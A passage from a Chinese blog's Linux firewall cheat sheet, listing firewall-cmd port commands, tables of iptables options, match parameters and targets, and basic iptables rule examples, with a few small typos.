<h3 id="禁用端口"><a href="#禁用端口" class="headerlink" title="禁用端口"></a>禁用端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --remove-port=80/tcp</span><br></pre></td></tr></table></figure>
<h3 id="刷新规则"><a href="#刷新规则" class="headerlink" title="刷新规则"></a>刷新规则</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<h3 id="查询端口是否开放"><a href="#查询端口是否开放" class="headerlink" title="查询端口是否开放"></a>查询端口是否开放</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --query-port=80w/tcp</span><br></pre></td></tr></table></figure>
<h3 id="查看已开放的端口"><a href="#查看已开放的端口" class="headerlink" title="查看已开放的端口"></a>查看已开放的端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --list-ports</span><br></pre></td></tr></table></figure>
<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><h3 id="防火墙命令参数"><a href="#防火墙命令参数" class="headerlink" title="防火墙命令参数"></a>防火墙命令参数</h3><table>
<thead>
<tr>
<th align="right">选 项</th>
<th align="left">功 能</th>
</tr>
</thead>
<tbody><tr>
<td align="right">-A</td>
<td align="left">添加防火墙规则</td>
</tr>
<tr>
<td align="right">-D</td>
<td align="left">删除防火墙规则</td>
</tr>
<tr>
<td align="right">-I</td>
<td align="left">插入防火墙规则</td>
</tr>
<tr>
<td align="right">-F</td>
<td align="left">清空防火墙规则</td>
</tr>
<tr>
<td align="right">-L</td>
<td align="left">列出添加防火墙规则</td>
</tr>
<tr>
<td align="right">-R</td>
<td align="left">替换防火墙规则</td>
</tr>
<tr>
<td align="right">-Z</td>
<td align="left">清空防火墙数据表统计信息</td>
</tr>
<tr>
<td align="right">-P</td>
<td align="left">设置链默认规则</td>
</tr>
</tbody></table>
<h3 id="防火墙规则增删改参数"><a href="#防火墙规则增删改参数" class="headerlink" title="防火墙规则增删改参数"></a>防火墙规则增删改参数</h3><table>
<thead>
<tr>
<th align="center">参 数</th>
<th align="left">功 能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[!]-p</td>
<td align="left">匹配协议（不加协议则是all），! 表示取反</td>
</tr>
<tr>
<td align="center">[!]-s</td>
<td align="left">匹配源地址</td>
</tr>
<tr>
<td align="center">[!]-d</td>
<td align="left">匹配目标地址</td>
</tr>
<tr>
<td align="center">[!]-i</td>
<td align="left">匹配入站网卡接口</td>
</tr>
<tr>
<td align="center">[!]-o</td>
<td align="left">匹配出站网卡接口</td>
</tr>
<tr>
<td align="center">[!]–sport</td>
<td align="left">匹配源端口</td>
</tr>
<tr>
<td align="center">[!]–dport</td>
<td align="left">匹配目标端口</td>
</tr>
<tr>
<td align="center">[!]–src-range</td>
<td align="left">匹配源地址范围</td>
</tr>
<tr>
<td align="center">[!]–dst-range</td>
<td align="left">匹配目标地址范围</td>
</tr>
<tr>
<td align="center">[!]–limit</td>
<td align="left">四配数据表速率</td>
</tr>
<tr>
<td align="center">[!]–mac-source</td>
<td align="left">匹配源MAC地址</td>
</tr>
<tr>
<td align="center">[!]–sports</td>
<td align="left">匹配源端口</td>
</tr>
<tr>
<td align="center">[!]–dports</td>
<td align="left">匹配目标端口</td>
</tr>
<tr>
<td align="center">[!]–stste</td>
<td align="left">匹配状态（INVALID、ESTABLISHED、NEW、RELATED)</td>
</tr>
<tr>
<td align="center">[!]–string</td>
<td align="left">匹配应用层字串</td>
</tr>
</tbody></table>
<h3 id="防火墙信息详细意义"><a href="#防火墙信息详细意义" class="headerlink" title="防火墙信息详细意义"></a>防火墙信息详细意义</h3><table>
<thead>
<tr>
<th align="center">触发动作</th>
<th align="left">功 能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ACCEPT</td>
<td align="left">允许数据包通过</td>
</tr>
<tr>
<td align="center">DROP</td>
<td align="left">丢弃数据包</td>
</tr>
<tr>
<td align="center">REJECT</td>
<td align="left">拒绝数据包通过</td>
</tr>
<tr>
<td align="center">LOG</td>
<td align="left">将数据包信息记录 syslog 曰志</td>
</tr>
<tr>
<td align="center">DNAT</td>
<td align="left">目标地址转换</td>
</tr>
<tr>
<td align="center">SNAT</td>
<td align="left">源地址转换</td>
</tr>
<tr>
<td align="center">MASQUERADE</td>
<td align="left">地址欺骗</td>
</tr>
<tr>
<td align="center">REDIRECT</td>
<td align="left">重定向</td>
</tr>
</tbody></table>
<p>原文链接：<a href="https://blog.csdn.net/daocaokafei/article/details/115091313">https://blog.csdn.net/daocaokafei/article/details/115091313</a></p>
<h3 id="命令使用实例"><a href="#命令使用实例" class="headerlink" title="命令使用实例"></a>命令使用实例</h3><p>查看防火墙规则</p>
<pre><code>iptables -L （可加INPUT或者OUTPUT等参数）
</code></pre>
<p>增加规则</p>
<pre><code>iptables -A INPUT -s 192.168.1.5 -j DROP
</code></pre>
<p>改规则</p>
<pre><code>iptables -R INPUT 6 -s 194.168.1.5 -j ACCEPT
</code></pre>
<p>删规则</p>
<pre><code>iptables -D INPUT 6
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
</search>
